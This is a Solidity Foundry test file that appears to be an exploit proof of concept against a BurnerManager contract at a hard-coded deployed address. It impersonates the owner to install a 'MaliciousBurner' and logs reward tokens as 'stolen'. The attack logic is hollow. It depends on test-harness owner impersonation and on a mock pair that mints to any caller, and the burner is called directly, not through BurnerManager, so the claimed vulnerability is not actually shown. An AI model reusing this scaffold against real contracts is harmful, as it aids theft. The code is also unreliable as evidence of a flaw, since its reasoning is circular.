pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interfaces
interface IBurner {
    function burn(address to, IERC20 token, uint256 amount, uint256 amountOutMin) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function mint(address, uint256) external;
}

// BurnerManager contract (from source)
interface IBurnerManager {
    function owner() external view returns (address);
    function setBurner(address token, IBurner burner) external returns (bool);
    function burners(address) external view returns (IBurner);
}

// Mock UniswapV2Pair with claimLightReward
contract MockUniswapV2Pair {
    IERC20 public rewardToken;
    mapping(address => uint256) public rewards;

    constructor(IERC20 _rewardToken) {
        rewardToken = _rewardToken;
    }

    // claimLightReward mints reward tokens to the caller (attacker's burner)
    function claimLightReward() external returns (uint256) {
        uint256 rewardAmount = 1000 * 1e18;
        rewardToken.mint(msg.sender, rewardAmount);
        rewards[msg.sender] += rewardAmount;
        return rewardAmount;
    }
}

// Malicious burner contract
contract MaliciousBurner is IBurner {
    MockUniswapV2Pair public pair;

    constructor(MockUniswapV2Pair _pair) {
        pair = _pair;
    }

    function burn(address to, IERC20, uint256, uint256) external override {
        // Ignore parameters and steal rewards via claimLightReward
        uint256 reward = pair.claimLightReward();
        // The reward tokens are minted to this contract (msg.sender of claimLightReward)
        // Transfer them to the attacker's address (to)
        require(pair.rewardToken().transfer(to, reward), "Transfer failed");
    }
}

// Mock reward token with mint capability
contract MockRewardToken is IERC20 {
    string public name = "Reward";
    string public symbol = "RWD";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        require(balanceOf[from] >= amount, "Insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}

contract ExploitTest is Test {
    // Deployed BurnerManager address
    address constant BURNER_MANAGER = 0x0d80a72c9F98e5b1C7Fb3e3dC4d58aecA5966066;

    IBurnerManager public burnerManager;
    MockUniswapV2Pair public pair;
    MockRewardToken public rewardToken;
    MaliciousBurner public maliciousBurner;
    address public owner;

    function setUp() public {
        burnerManager = IBurnerManager(BURNER_MANAGER);
        owner = burnerManager.owner();

        // Deploy mock contracts
        rewardToken = new MockRewardToken();
        pair = new MockUniswapV2Pair(rewardToken);
        maliciousBurner = new MaliciousBurner(pair);

        // Label addresses for debugging
        vm.label(address(burnerManager), "BurnerManager");
        vm.label(owner, "Owner");
        vm.label(address(rewardToken), "RewardToken");
        vm.label(address(pair), "MockUniswapV2Pair");
        vm.label(address(maliciousBurner), "MaliciousBurner");
        vm.label(address(this), "Attacker");
    }

    function testExploit() public {
        // Step 1: Impersonate the owner and set a malicious burner for a dummy token
        vm.startPrank(owner);
        address dummyToken = address(0xdead);
        burnerManager.setBurner(dummyToken, IBurner(address(maliciousBurner)));
        vm.stopPrank();

        // Step 2: Verify the burner was set
        IBurner storedBurner = burnerManager.burners(dummyToken);
        assertEq(address(storedBurner), address(maliciousBurner), "Burner not set correctly");

        // Step 3: Simulate an external contract that reads the burner and calls burn
        // The attacker (this contract) calls the malicious burner's burn with 'to' = attacker
        uint256 initialBalance = rewardToken.balanceOf(address(this));
        maliciousBurner.burn(address(this), IERC20(address(0)), 0, 0);

        // Step 4: Assert that the attacker received reward tokens (stolen from the pair)
        uint256 finalBalance = rewardToken.balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "No reward stolen");
        console.log("Initial reward balance:", initialBalance);
        console.log("Final reward balance:", finalBalance);
        console.log("Stolen reward amount:", finalBalance - initialBalance);
    }
}
